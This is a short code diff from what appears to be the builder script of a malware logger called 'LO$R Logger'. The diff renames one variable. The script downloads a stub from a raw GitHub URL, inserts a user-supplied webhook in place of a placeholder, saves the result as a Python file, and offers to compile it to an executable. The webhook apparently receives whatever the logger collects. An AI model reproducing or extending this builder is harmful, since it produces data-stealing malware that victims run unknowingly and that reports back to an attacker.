@@ -29,9 +29,9 @@ else:
     time.sleep(3) 
     exit()
 name = Write.Input("Enter File Name:", Colors.blue_to_purple, interval=0.01)
-code = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
+stub = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
 with open(f"{name}.py", 'w', encoding='utf8') as f:
-    f.write(code.text.replace("webhooker", webhook))
+    f.write(stub.text.replace("webhooker", webhook))
 Write.Print("LO$R Logger Was SucessFully Built\n",Colors.blue_to_purple, interval=0.01)
 compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.blue_to_purple, interval=0.01)
 if compile == "y":
